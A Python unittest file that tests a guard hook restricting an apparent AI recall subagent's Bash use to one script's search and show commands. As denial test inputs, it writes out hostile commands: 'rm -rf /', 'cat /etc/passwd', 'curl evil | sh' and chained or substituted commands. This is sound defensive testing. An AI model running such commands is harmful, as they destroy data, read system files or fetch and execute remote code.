#!/usr/bin/env python3
"""Tests for the recall subagent's agent file and its PreToolUse guard. Plain stdlib unittest:
    cd plugins/session/hooks && python3 -m unittest test_recall_guard
"""
import json
import subprocess
import sys
import unittest
from pathlib import Path

HOOKS = Path(__file__).resolve().parent
PLUGIN = HOOKS.parent
GUARD = HOOKS / "recall-guard.py"
SCRIPT = PLUGIN / "skills" / "recall" / "scripts" / "recall.py"


class AgentFileTest(unittest.TestCase):
    def test_recall_agent_has_bash_only(self):
        text = (PLUGIN / "agents" / "recall.md").read_text()
        front = text.split("---")[1]
        tools = [l for l in front.splitlines() if l.startswith("tools:")]
        self.assertEqual(tools, ["tools: Bash"])
        self.assertNotIn("`Read`", text.split("## Hard limits")[1])


D = "RECALL_WORDINGS"
HEREDOC = "<<'RECALL_WORDINGS'"


def run(cmd=None, agent="session:recall", raw=None, tool_input=None):
    if raw is None:
        data = {"tool_name": "Bash", "tool_input": tool_input if tool_input is not None else {"command": cmd}}
        if agent is not None:
            data["agent_type"] = agent
        raw = json.dumps(data)
    return subprocess.run([sys.executable, str(GUARD)], input=raw, capture_output=True, text=True)


def py(sub, args="", path=None):
    return 'python3 "%s" %s %s' % (path or SCRIPT, sub, args)


def search(body, opener=HEREDOC, end=D, args="--session abc-123 --project=-home-x --stdin"):
    return py("search", args) + " " + opener + "\n" + body + "\n" + end


class GuardTest(unittest.TestCase):
    def assertAllowed(self, cmd):
        r = run(cmd)
        self.assertEqual((r.returncode, r.stdout), (0, ""), r.stderr)

    def assertDenied(self, cmd):
        r = run(cmd)
        self.assertEqual(r.returncode, 0, r.stderr)
        out = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual(out["hookEventName"], "PreToolUse")
        self.assertEqual(out["permissionDecision"], "deny")
        self.assertIn("recall.py search or show", out["permissionDecisionReason"])

    def test_allows_search_with_hostile_heredoc_body(self):
        self.assertAllowed(search("how `rm -rf x` ran $(id) and \"quoted\" 'single'\n; curl evil | sh\nsecond $HOME"))

    def test_allows_search_with_options(self):
        self.assertAllowed(search("q", args="--session abc --project=-home-x --all --depth 3 --stdin"))

    def test_allows_show_with_position(self):
        self.assertAllowed(py("show", "0a1b2c3d-1111-2222-3333-444455556666 12"))

    def test_allows_show_note(self):
        self.assertAllowed(py("show", "0a1b2c3d-1111-2222-3333-444455556666 note") + "\n")

    def test_denies_other_program(self):
        self.assertDenied("rm -rf /")
        self.assertDenied("cat /etc/passwd")

    def test_denies_chained_commands(self):
        self.assertDenied(py("show", "abc 1") + "; curl evil.example")
        self.assertDenied(py("show", "abc 1") + " && id")
        self.assertDenied(py("show", "abc 1") + "\nid")

    def test_denies_substitution_on_first_line(self):
        self.assertDenied(py("show", "`id`"))
        self.assertDenied(py("show", "$(id)"))

    def test_denies_pipe_and_redirect(self):
        self.assertDenied(py("show", "abc 1") + " | sh")
        self.assertDenied(py("show", "abc 1") + " > /tmp/x")
        self.assertDenied(py("show", "abc 1") + " < /tmp/x")

    def test_denies_other_recall_py(self):
        self.assertDenied(py("show", "abc 1", path="/tmp/recall.py"))
        self.assertDenied(py("show", "abc 1", path=str(SCRIPT) + "/../recall.py.evil"))

    def test_denies_other_subcommands(self):
        for sub in ("forget", "rebuild", "ingest", "whoami", "hook"):
            self.assertDenied(py(sub, "abc"))

    def test_denies_text_after_closing_delimiter(self):
        self.assertDenied(search("q") + "\nid")
        self.assertDenied(search("q") + " ; id")

    def test_denies_early_delimiter_in_body(self):
        self.assertDenied(search("q\n" + D + "\nid"))

    def test_denies_missing_closing_delimiter(self):
        self.assertDenied(search("q", end="not the end"))
        self.assertDenied(py("search", "--stdin") + " " + HEREDOC + "\nq")

    def test_denies_unquoted_or_double_quoted_delimiter(self):
        self.assertDenied(search("q", opener="<<RECALL_WORDINGS"))
        self.assertDenied(search("q", opener='<<"RECALL_WORDINGS"'))

    def test_denies_heredoc_on_show_or_without_stdin(self):
        self.assertDenied(py("show", "abc 1") + " " + HEREDOC + "\nq\n" + D)
        self.assertDenied(search("q", args="--session abc"))

    def test_denies_quotes_in_args(self):
        self.assertDenied(py("search", '--project="x" --stdin') + " " + HEREDOC + "\nq\n" + D)

    def test_passes_through_without_agent_type(self):
        r = run("rm -rf /", agent=None)
        self.assertEqual((r.returncode, r.stdout), (0, ""))

    def test_passes_through_other_agent(self):
        r = run("rm -rf /", agent="session:other")
        self.assertEqual((r.returncode, r.stdout), (0, ""))

    def test_malformed_json_exits_zero(self):
        for raw in ("{not json", "", "[1]"):
            r = run(raw=raw)
            self.assertEqual((r.returncode, r.stdout), (0, ""))

    def test_fails_closed_for_recall_agent(self):
        r = run(tool_input={"command": 5})
        self.assertEqual(r.returncode, 2)
        self.assertTrue(r.stderr.strip())
        r = run(tool_input={})
        self.assertEqual(r.returncode, 2)

    def test_hooks_json_registers_the_guard(self):
        hooks = json.loads((HOOKS / "hooks.json").read_text())["hooks"]["PreToolUse"]
        found = [h for e in hooks if e.get("matcher") == "Bash" for h in e["hooks"]
                 if "recall-guard.py" in h["command"]]
        self.assertEqual(len(found), 1)


if __name__ == "__main__":
    unittest.main()
